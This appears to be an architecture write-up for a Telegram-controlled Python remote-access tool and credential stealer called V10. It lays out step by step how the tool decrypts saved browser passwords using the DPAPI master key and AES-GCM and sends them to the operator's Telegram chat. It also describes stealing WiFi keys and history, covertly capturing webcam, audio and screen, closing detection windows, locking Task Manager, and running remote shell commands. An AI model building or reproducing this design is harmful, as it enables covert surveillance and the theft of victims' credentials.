# 📊 ARCHITECTURE & LOGIC FLOW - V10 REFACTORED

> **Developer:** TsByin  
> **Version:** 2.0 (Refactored & Optimized)

## **I. CẤU TRÚC FILE & MODULE**

```
┌─────────────────────────────────────────────────────────────┐
│                     V10.py (Main Entry)                     │
│                    (866 dòng code)                          │
│  Xử lý tất cả handlers & callbacks từ Telegram Bot          │
└──────────────┬──────────────────────────────────────────────┘
               │
       ┌───────┼───────┬───────────┬──────────┬────────┐
       │       │       │           │          │        │
       ▼       ▼       ▼           ▼          ▼        ▼
   config   utils  grabber      media     monitor   .env
   (112)    (280)   (362)       (160)     (254)     (16)
   ───────────────────────────────────────────────────────────
   Setup  Helpers Password   Screenshot  Monitor  Config
   Logging        History    Webcam      Stats   Tokens
            Protec  WiFi     Audio      Thread  Settings
            Files          Video      Motion
                                      Alert
```

---

## **II. WORKFLOW - TỪ STARTUP ĐẾN CHẠY**

### **Phase 1: INITIALIZATION (Startup)**

```
┌─────────────────────────────────────────────────────────┐
│ python V10.py                                           │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ 1. Import modules                                       │
│    ├─ from config import API_TOKEN, ADMIN_ID, ...       │
│    ├─ from utils import helpers...                      │
│    ├─ from grabber import password extraction...        │
│    ├─ from media import screenshot/webcam...            │
│    └─ from monitor import SystemMonitor, BotStats       │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ 2. config.py LOADS                                      │
│    ├─ Load .env file (API_TOKEN, ADMIN_ID)              │
│    ├─ Setup logging → bot.log                           │
│    ├─ Validate tokens                                   │
│    ├─ Load browser paths, settings                      │
│    └─ Return constants to V10.py                        │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ 3. V10.py INITIALIZES GLOBALS                           │
│    ├─ bot = TeleBot(API_TOKEN)                          │
│    ├─ bot_stats = BotStats()                            │
│    ├─ BLOCKED_DATA = load_blocked_list()                │
│    ├─ CURRENT_SETTINGS = load_settings()                │
│    └─ State: intrusion_alert, block_mode, taskmgr       │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ 4. START MONITORING THREAD                              │
│    ├─ monitor = SystemMonitor(ADMIN_ID, bot, config)    │
│    ├─ threading.Thread(target=monitor.run)              │
│    └─ Thread starts background monitoring               │
└────────────────┬────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│ 5. BOT POLLING STARTED                                  │
│    ├─ bot.infinity_polling()                            │
│    ├─ Wait for Telegram messages                        │
│    └─ Ready to handle commands                          │
└─────────────────────────────────────────────────────────┘
```

---

## **III. CONCURRENT MESSAGE HANDLING**

### **When User Sends Command:**

```
┌────────────────────────────────────────┐
│  Telegram → /menu 1                    │
└─────────────┬──────────────────────────┘
              │
              ▼
┌────────────────────────────────────────┐
│ Bot receives message                   │
│ Matches handler: @bot.message_handler  │
└─────────────┬──────────────────────────┘
              │
              ▼
┌────────────────────────────────────────┐
│ menu_handler(m) triggered              │
│ ├─ Check: m.from_user.id == ADMIN_ID   │
│ ├─ Parse args: ['/menu', '1']          │
│ └─ send_reply_menu(m)                  │
└─────────────┬──────────────────────────┘
              │
              ▼
┌────────────────────────────────────────┐
│ send_reply_menu() creates keyboard     │
│ ├─ ReplyKeyboardMarkup(row_width=2)    │
│ ├─ Add buttons: 🔑 🌐 🖼 📸...         │
│ └─ bot.send_message(m.chat.id, ...)    │
└─────────────┬──────────────────────────┘
              │
              ▼
┌────────────────────────────────────────┐
│ Message sent back to Telegram          │
│ User sees keyboard menu                │
└────────────────────────────────────────┘
```

---

## **IV. EXAMPLE: PASSWORD EXTRACTION FLOW**

### **User sends: 🔑 Lấy Passwords**

```
┌───────────────────────────────────────────────────┐
│ User presses: 🔑 Lấy Passwords                    │
└─────────────┬─────────────────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────────────┐
│ h_pass(m) handler triggered                        │
│ ├─ Check admin ID                                  │
│ └─ threading.Thread(target=task, daemon=True)      │
└─────────────┬──────────────────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────────────┐
│ Background Task Starts (không block UI)            │
│ ├─ bot.send_message("⏳ Đang trích xuất...")      │
│ └─ outfile = grab_passwords()                      │
└─────────────┬──────────────────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────────────┐
│ grabber.py: grab_passwords() EXECUTES              │
│                                                    │
│ ┌─ ThreadPoolExecutor(max_workers=4)               │
│ │  ├─ Future 1: Extract from Chrome (5s)           │
│ │  ├─ Future 2: Extract from Edge (5s)             │
│ │  ├─ Future 3: Extract from Firefox (3s)          │
│ │  └─ Future 4: Extract from Coccoc (3s)           │
│ │  = 8s total (parallel, not 16s sequential)       │
│ │                                                  │
│ ├─ Combine all passwords from 4 workers            │
│ ├─ Compress: gzip.open() → file.gz (50% smaller)   │
│ └─ Return compressed filename                      │
└─────────────┬──────────────────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────────────┐
│ Back in task: Send file to Telegram                │
│ ├─ bot.send_document(m.chat.id, file)              │
│ ├─ cleanup_media_file() - xóa file tạm             │
│ ├─ bot_stats.increment_command()                   │
│ └─ logging.info("Passwords sent successfully")     │
└─────────────┬──────────────────────────────────────┘
              │
              ▼
┌────────────────────────────────────────────────────┐
│ User nhận file password.txt.gz                     │
│ Task complete, thread exits                        │
└────────────────────────────────────────────────────┘
```

**Key Optimization:** 4 browsers extracted in parallel = **2-3x nhanh hơn!**

---

## **V. MONITOR THREAD - BACKGROUND OPERATIONS**

### **Runs Continuously (Mỗi 1 giây):**

```
┌─────────────────────────────────────────────────────┐
│ monitor.run() - Chạy vô hạn (Thread daemon)         │
└──────────────┬──────────────────────────────────────┘
               │
        Loop mỗi 1 giây:
        ├─ Check 1: _check_self_defense()
        │           └─ Auto close detection windows
        │
        ├─ Check 2: _check_blocked_apps()
        │           └─ Nếu block_mode_active:
        │              Kill blocked processes
        │
        ├─ Check 3: _check_taskmgr()
        │           └─ Nếu taskmgr_locked:
        │              Kill taskmgr.exe liên tục
        │
        ├─ Check 4: _check_cpu_alert()
        │           └─ Nếu CPU > threshold:
        │              Send alert (với debounce 5 min)
        │
        └─ Check 5: _check_intrusion_alert()
                    └─ Nếu intrusion_alert_active:
                       ├─ Capture 2 frames từ webcam
                       ├─ Detect motion (absdiff)
                       └─ Send photo nếu motion > threshold
               │
        time.sleep(1)  ← Chờ 1 giây rồi lặp lại
```

**Ví dụ: CPU Alert**

```python
def _check_cpu_alert(self):
    cpu = psutil.cpu_percent(interval=0.5)
    
    if cpu > 95:  # Ngưỡng
        last_alert = self.last_alerts.get('cpu', 0)
        if time.time() - last_alert > 300:  # Chưa alert trong 5 min
            bot.send_message(ADMIN_ID, f"⚠️ CPU: {cpu}%")
            self.last_alerts['cpu'] = time.time()  # Update time
```

**Benefit:** Debounce = không spam alerts, tiết kiệm resources

---

## **VI. DATA FLOW - PASSWORD EXTRACTION DETAIL**

```
extracting passwords:

┌─── Chrome (browser_name="Chrome", path=...)
│    └─ get_master_key(path)
│       └─ Read: Local State → os_crypt encrypted_key
│          └─ CryptUnprotectData() → master_key
│    └─ Loop profiles: ["Default", "Profile 1", ...]
│       └─ Open: Login Data (SQLite database)
│          └─ Query: SELECT action_url, username, password
│             └─ For each row:
│                ├─ encrypted_pass[3:15] = IV
│                ├─ encrypted_pass[15:] = cipher
│                └─ AES.MODE_GCM.decrypt() → password
│                   ├─ Remove padding [:-16]
│                   └─ Decode UTF-8
│                      └─ Save: "[Chrome] url | user | pass"
│
├─── Edge (same as Chrome, different path)
│
├─── Firefox (different database format)
│    └─ Open: places.sqlite
│       └─ SELECT url, username, password (stored as plaintext for some)
│          └─ Some may be encrypted differently
│
└─── Others (Coccoc, Brave, Opera...)

Final:
├─ Combine all passwords from all browsers
├─ Write to file: pass.txt
├─ Compress: gzip.open() → pass.txt.gz (50% smaller)
└─ Return: pass.txt.gz
```

---

## **VII. CALLBACK HANDLER - INLINE BUTTONS**

### **When User Clicks Inline Button:**

```
User clicks: 🔑 Passwords (callback_data="cmd_pass")
       │
       ▼
@bot.callback_query_handler(func=lambda c: True)
def cb_handler(c):  # c = callback query
    │
    ├─ Check: c.from_user.id == ADMIN_ID
    │
    ├─ data = c.data = "cmd_pass"
    │
    ├─ if data in CALLBACK_MAP:
    │    └─ CALLBACK_MAP["cmd_pass"](c.message)
    │       └─ Call h_pass(m) ← Same as text button!
    │
    └─ All buttons mapped to same function
```

**Benefit:** Một handler cho cả 2 menu type!

---

## **VIII. FILE STATE & PERSISTENCE**

### **Data Files Created Automatically:**

```
bot.log (Logging)
├─ 2025-12-05 10:15:32 - config - INFO - ✅ Bot configured
├─ 2025-12-05 10:15:33 - monitor - INFO - 🟢 System monitor started
├─ 2025-12-05 10:16:15 - grabber - INFO - Extracted 12 passwords
└─ 2025-12-05 10:17:00 - __main__ - ERROR - Webhook error

blocked.json (Blocked apps/sites)
├─ {"apps": ["taskmgr.exe", "control.exe"], "sites": ["facebook.com"]}
└─ Auto-updated when /block command used

settings.json (Menu state)
├─ {"menu_mode": 1}  # or 2
└─ Auto-updated when /menu command used
```

---

## **IX. SECURITY FLOW**

```
┌─────────────────────────────────────┐
│ .env file (MUST NOT COMMIT)         │
│ API_TOKEN=xxx                       │
│ ADMIN_ID=xxx                        │
└──────────┬──────────────────────────┘
           │
           ▼
┌─────────────────────────────────────┐
│ config.py loads .env                │
│ os.getenv('API_TOKEN')              │
└──────────┬──────────────────────────┘
           │
           ▼
┌─────────────────────────────────────┐
│ Validate tokens exist               │
│ if not API_TOKEN: raise ValueError  │
└──────────┬──────────────────────────┘
           │
           ▼
┌─────────────────────────────────────┐
│ V10.py uses API_TOKEN               │
│ Never exposed in code               │
└─────────────────────────────────────┘
```

**Advantage over old V10:**
- Cũ: `API_TOKEN = "xxx"` hardcoded (nguy hiểm!)
- Mới: `API_TOKEN = os.getenv('API_TOKEN')` (an toàn!)

---

## **X. THREAD MANAGEMENT**

### **Main Thread:**
```
infinity_polling() ← Chờ messages từ Telegram
```

### **Monitor Thread (Background):**
```
monitor.run() ← Check CPU, camera, apps, etc.
```

### **Task Threads (On-demand):**
```
h_pass() → threading.Thread(target=task)
├─ Grab passwords (không block main)
└─ Send to Telegram when done
```

**Model:** Producer-Consumer
- Main: Receives commands
- Monitor: Runs checks
- Tasks: Execute commands

---

## **XI. MODULE RESPONSIBILITIES**

```
config.py
├─ Load .env
├─ Setup logging
└─ Define constants

utils.py
├─ Window operations
├─ File management
├─ System protection
└─ JSON operations

grabber.py
├─ Extract passwords (CONCURRENT!)
├─ Extract history
└─ Extract WiFi

media.py
├─ Screenshot
├─ Webcam
├─ Audio recording
└─ Video recording

monitor.py
├─ SystemMonitor class
│  ├─ CPU alerts
│  ├─ Motion detection
│  ├─ App blocking
│  └─ Graceful shutdown
└─ BotStats class
   ├─ Track commands
   └─ Track data size

V10.py (Main)
├─ Telegram handlers
├─ Command routing
├─ State management
└─ Orchestration
```

---

## **XII. QUICK REFERENCE - KEY FLOWS**

```
USER ACTION           →  HANDLER              →  MODULE
─────────────────────────────────────────────────────────────
/menu 1              →  menu_handler()       →  (create menu)
🔑 Passwords         →  h_pass()             →  grabber.grab_passwords()
📸 Webcam            →  h_cam()              →  media.capture_webcam()
🖼 Screenshot        →  h_scr()              →  media.smart_screenshot()
💓 Stats             →  check_status()       →  monitor.BotStats
⚙️ Processes         →  h_proc()             →  psutil.process_iter()
🚫 Block App         →  toggle_block()       →  monitor check
🔒 Lock TaskMgr      →  toggle_taskmgr()     →  monitor check
📂 Browse Files      →  h_exp()              →  os.listdir()
/block app xxx       →  block_mgr()          →  save blocked_data
/cmd ls              →  run_shell()          →  subprocess.run()
```

---

**✅ Now you understand the complete architecture!**

Save as: ARCHITECTURE.md
